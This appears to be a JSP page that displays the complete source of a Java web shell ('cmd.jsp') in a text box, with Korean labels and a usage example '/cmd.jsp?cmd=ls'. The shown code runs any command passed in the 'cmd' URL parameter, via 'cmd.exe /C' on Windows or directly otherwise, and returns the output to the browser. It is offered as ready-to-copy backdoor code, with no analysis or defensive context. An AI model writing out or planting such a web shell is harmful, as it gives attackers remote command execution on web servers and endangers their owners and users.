
example : /cmd.jsp?cmd=ls  <br><br>

<%@ page import="java.util.*,java.io.*"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Insert title here</title>
<style>
    #target-textarea {
        box-sizing: border-box;
        resize: none;
        border: 1px solid rgb(42, 42, 42);
        width: 100%;
		height: 80%;
    }
    /* 아래는 기본 래퍼 설정 */
    #wrapper {
        margin: 0 auto;
        padding: 10px 20%;
        max-width: 1170px;
    }
</style>

</head>


<textarea id="target-textarea" disabled>   
<body>
<form method="GET" name="cmdForm" action="">
<input type="text" name="cmd">
<input type="submit" value="전송">
</form>
<pre>
&lt;%
if (request.getParameter("cmd") != null)
{
	out.println("명령어 : " + request.getParameter("cmd") + "<br>");
	
	Process p;
	
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    
    else
		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	
	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
	BufferedReader br = new BufferedReader(in);
	
	String disr = br.readLine();
	
	while ( disr != null )
	{
		out.println(disr); 
		disr = br.readLine(); 
	}
}
%&gt;
</pre>
</textarea>
</body>
</html>
